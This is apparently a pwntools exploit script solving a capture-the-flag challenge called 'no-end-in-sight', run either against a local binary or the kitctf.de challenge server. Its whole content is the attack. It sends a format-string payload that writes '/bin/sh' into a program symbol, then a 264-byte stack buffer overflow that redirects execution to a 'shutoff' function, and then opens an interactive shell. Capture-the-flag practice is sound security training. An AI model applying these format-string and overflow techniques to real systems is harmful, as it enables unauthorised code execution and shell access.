from pwn import *

if args.REMOTE:
    p = remote('no-end-in-sight-0.chals.kitctf.de', 1337, ssl=True)
else:
    p = process("./no-end-in-sight")
    if args.GDB:
        gdb.attach(p, gdbscript="""
            break main
        """)

if args.DEBUG:
    p = gdb.debug("./no-end-in-sight")

exe = context.binary = ELF("./no-end-in-sight", checksec=False)

payload = fmtstr_payload(6, {exe.symbols.BINSH: b"/bin/sh"})
p.sendline(payload)

payload = b"A" * 264 + p64(exe.symbols.shutoff)
p.sendline(payload)

p.interactive()